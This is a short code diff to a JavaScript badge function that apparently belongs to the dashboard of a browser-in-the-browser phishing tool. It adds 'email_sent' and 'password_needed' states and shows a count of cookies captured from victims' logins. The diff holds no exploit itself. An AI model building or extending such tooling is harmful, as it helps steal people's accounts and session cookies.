@@ -186,7 +186,7 @@
 
     function bitbBadge(bitb) {
       if (!bitb) return '';
-      if (bitb.status === 'logging_in') return '<span class="inline-block ml-1 px-1.5 py-0.5 rounded text-[9px] font-bold bg-yellow-100 text-yellow-700" title="BITB login in progress">BITB</span>';
+      if (bitb.status === 'email_sent' || bitb.status === 'password_needed' || bitb.status === 'logging_in') return '<span class="inline-block ml-1 px-1.5 py-0.5 rounded text-[9px] font-bold bg-yellow-100 text-yellow-700" title="BITB: ' + bitb.status + '">BITB</span>';
       if (bitb.status === 'complete') return '<span class="inline-block ml-1 px-1.5 py-0.5 rounded text-[9px] font-bold bg-green-100 text-green-700" title="' + (bitb.cookie_count || 0) + ' cookies captured via BITB">BITB</span>';
       if (bitb.status === 'failed') return '<span class="inline-block ml-1 px-1.5 py-0.5 rounded text-[9px] font-bold bg-red-100 text-red-700" title="BITB login failed">BITB</span>';
       return '';
